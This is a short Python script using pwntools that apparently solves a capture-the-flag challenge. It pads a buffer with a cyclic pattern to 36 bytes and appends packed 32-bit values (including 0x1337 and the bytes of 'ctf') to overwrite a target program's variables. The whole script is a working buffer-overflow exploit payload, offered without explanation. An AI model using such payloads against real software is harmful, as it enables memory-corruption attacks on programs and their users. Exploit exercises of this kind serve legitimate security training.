from pwn import *
import sys

payload = b''
payload += p32(0x2a)
payload += p32(0x14 + 1)
payload += p32(0x667463)
payload += p32(0xffffffec-1)
payload += p32(0x1337)

payload = cyclic(36 - len(payload)) + payload
sys.stdout.buffer.write(payload + b'\n')
